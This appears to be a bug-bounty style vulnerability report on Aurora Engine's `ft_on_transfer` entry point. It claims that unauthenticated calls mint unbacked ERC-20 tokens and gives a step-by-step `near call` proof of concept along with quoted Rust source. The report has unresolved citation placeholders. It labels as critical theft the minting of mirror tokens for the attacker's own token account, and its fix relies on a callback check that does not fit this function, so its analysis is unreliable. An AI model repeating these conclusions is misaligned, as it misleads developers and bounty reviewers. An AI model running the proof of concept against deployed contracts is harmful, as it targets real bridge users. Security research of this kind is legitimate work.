### Title
Unauthenticated `ft_on_transfer` Allows Minting Unbacked ERC-20 Tokens Without Transferring NEP-141 Assets - (File: `engine/src/contract_methods/connector.rs`)

---

### Summary

The `ft_on_transfer` entry point of the Aurora Engine contains no verification that the call originates from a legitimate NEP-141 `ft_transfer_call` flow. Any NEAR account that has a registered ERC-20 mapping in Aurora can call `ft_on_transfer` directly — without transferring any NEP-141 tokens — and cause Aurora to mint ERC-20 tokens to an arbitrary EVM address. This is a direct structural analog to the reported `repay_stable_coin` auth-bypass: a function intended to be called only by a trusted counterpart (the NEP-141 token contract) is callable by anyone, allowing state changes (token minting) without the required economic action (token transfer).

---

### Finding Description

`ft_on_transfer` is a public NEAR contract method exposed at `engine/src/lib.rs`: [1](#0-0) 

Its implementation in `engine/src/contract_methods/connector.rs` reads: [2](#0-1) 

The only caller-identity check performed is:

```rust
if predecessor_account_id == get_connector_account_id(&io)? {
    engine.receive_base_tokens(&args)   // ETH minting path
} else {
    engine.receive_erc20_tokens(...)    // ERC-20 minting path
}
``` [3](#0-2) 

There is **no assertion** that:
- The call is a callback of a prior `ft_transfer_call` promise.
- The predecessor has actually transferred any NEP-141 tokens to Aurora before this call.

The `receive_erc20_tokens` path resolves the ERC-20 contract address from the predecessor account ID via `get_erc20_from_nep141`, then calls the ERC-20 contract's `mint` function with the caller-supplied `amount`: [4](#0-3) 

The `deploy_erc20_token` function — which registers a NEP-141 account and deploys its ERC-20 mirror — contains only a `require_running` check and **no owner or whitelist restriction**, making registration permissionless: [5](#0-4) 

Contrast this with callback functions that correctly use `env.assert_private_call()` to enforce self-call-only access: [6](#0-5) 

`ft_on_transfer` has no equivalent guard.

---

### Impact Explanation

An attacker who controls a NEAR account `attacker-token.near` can:

1. Call `deploy_erc20_token` on Aurora to register `attacker-token.near` and obtain an ERC-20 mirror contract at address `0xABC…`.
2. Call `ft_on_transfer` on Aurora **directly** from `attacker-token.near`, supplying `amount = N` and `msg = <attacker_evm_address>`.
3. Aurora's engine resolves `attacker-token.near → 0xABC…`, then calls `mint(attacker_evm_address, N)` on the ERC-20 contract — **without any NEP-141 tokens ever being transferred to Aurora**.

The attacker now holds `N` ERC-20 tokens on Aurora that are entirely unbacked. These tokens can be:
- Deposited as collateral in Aurora DeFi lending protocols to borrow real assets (ETH, USDC ERC-20 mirrors).
- Sold on Aurora DEXes to other users who believe they represent real bridged value.
- Used to create insolvency: legitimate holders of the same ERC-20 token who try to exit (burn ERC-20 → receive NEP-141) will find Aurora's NEP-141 balance insufficient to cover all outstanding ERC-20 supply.

**Impact class**: Direct theft of user funds (via DeFi collateral drain) and insolvency of the bridge for the affected token — **Critical**.

---

### Likelihood Explanation

The attack requires:
1. Creating a NEAR account (trivial, costs fractions of a cent).
2. Calling `deploy_erc20_token` (permissionless, no owner check).
3. Calling `ft_on_transfer` directly (any NEAR account can call any public contract method).

No privileged access, leaked keys, or governance capture is required. The attack is fully executable by any unprivileged NEAR user. Likelihood is **High**.

---

### Recommendation

Add a verification step inside `ft_on_transfer` (or inside `receive_erc20_tokens`) that confirms the call is a genuine callback of a prior `ft_transfer_call` promise. In NEAR, a callback context is detectable via `promise_results_count() > 0`. Additionally, consider maintaining an allowlist of trusted NEP-141 token contracts that are permitted to trigger minting, rather than accepting any predecessor that has a registered ERC-20 mapping.

---

### Proof of Concept

```
# Step 1 – Register attacker-controlled NEP-141 account with Aurora (permissionless)
near call aurora.near deploy_erc20_token \
  '{"nep141": "attacker-token.near"}' \
  --accountId attacker.near

# Step 2 – Call ft_on_transfer directly from attacker-token.near
#           No actual ft_transfer_call is made; no NEP-141 tokens are transferred.
near call aurora.near ft_on_transfer \
  '{"sender_id": "victim.near", "amount": "1000000000000000000000000", "msg": "<attacker_evm_address_hex>"}' \
  --accountId attacker-token.near

# Result: Aurora mints 1e24 ERC-20 tokens to attacker's EVM address.
# Aurora holds 0 attacker-token.near NEP-141 tokens.
# Bridge is insolvent for attacker-token.near ERC-20.
```

The root cause is the absence of any access control or transfer-proof verification in `ft_on_transfer`, directly mirroring the `repay_stable_coin` pattern where a privileged state-mutation function is callable by any account without spending the underlying asset.

pub fn ft_on_transfer<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I,
    env: &E,
    handler: &mut H,
) -> Result<Option<SubmitResult>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;
        let current_account_id = env.current_account_id();
        let predecessor_account_id = env.predecessor_account_id();
        let mut engine: Engine<_, _> = Engine::new(
            predecessor_address(&predecessor_account_id),
            current_account_id.clone(),
            io,
            env,
        )?;

        sdk::log!("Call ft_on_transfer");

        let args: FtOnTransferArgs = read_json_args(&io)?;
        let result = if predecessor_account_id == get_connector_account_id(&io)? {
            engine.receive_base_tokens(&args)
        } else {
            engine.receive_erc20_tokens(
                &predecessor_account_id,
                &args,
                &current_account_id,
                handler,
            )
        };

        #[allow(clippy::used_underscore_binding)]
        let amount_to_return = if let Err(_err) = &result {
            sdk::log!("Error in ft_on_transfer: {_err:?}");
            // An error occurred, so we need to return the amount of tokens to the sender.
            args.amount.as_u128()
        } else {
            // Everything is ok, so return 0.
            0
        };

        let output = crate::prelude::format!("\"{amount_to_return}\"");
        io.return_output(output.as_bytes());

        // In case of an error, we just return Ok(None) to avoid a panic in the contract. It's ok
        // because in case of an error, we already returned the amount of tokens to the sender.
        Ok(result.unwrap_or(None))
    })
}

    pub fn receive_erc20_tokens<P: PromiseHandler>(
        &mut self,
        token: &AccountId,
        args: &FtOnTransferArgs,
        current_account_id: &AccountId,
        handler: &mut P,
    ) -> Result<Option<SubmitResult>, ContractError> {
        let amount = args.amount.as_u128();
        // Parse message to determine recipient
        let mut recipient = {
            // The message should contain the recipient EOA address.
            let message = args.msg.strip_prefix("0x").unwrap_or(&args.msg);
            // Recipient - 40 characters (Address in hex without '0x' prefix)
            if message.len() < 40 {
                return Err(ParseOnTransferMessageError::WrongMessageFormat.into());
            }
            let mut address_bytes = [0; 20];
            hex::decode_to_slice(&message[..40], &mut address_bytes)
                .map_err(|_| ParseOnTransferMessageError::WrongMessageFormat)?;
            Address::from_array(address_bytes)
        };

        if let Some(fallback_address) = silo::get_erc20_fallback_address(&self.io)
            && !silo::is_allow_receive_erc20_tokens(&self.io, &recipient)
        {
            recipient = fallback_address;
        }

        let erc20_token = get_erc20_from_nep141(&self.io, token)?;
        let erc20_admin_address = current_address(current_account_id);
        let result = self
            .call(
                &erc20_admin_address,
                &erc20_token,
                Wei::zero(),
                setup_receive_erc20_tokens_input(&recipient, amount),
                u64::MAX,
                Vec::new(), // TODO: are there values we should put here?
                Vec::new(),
                handler,
            )
            .and_then(submit_result_or_err)?;

        sdk::log!("Mint {amount} ERC-20 tokens for: {}", recipient.encode());

        // Return SubmitResult so that it can be accessed in standalone engine.
        // This is used to help with the indexing of bridge transactions.
        Ok(Some(result))
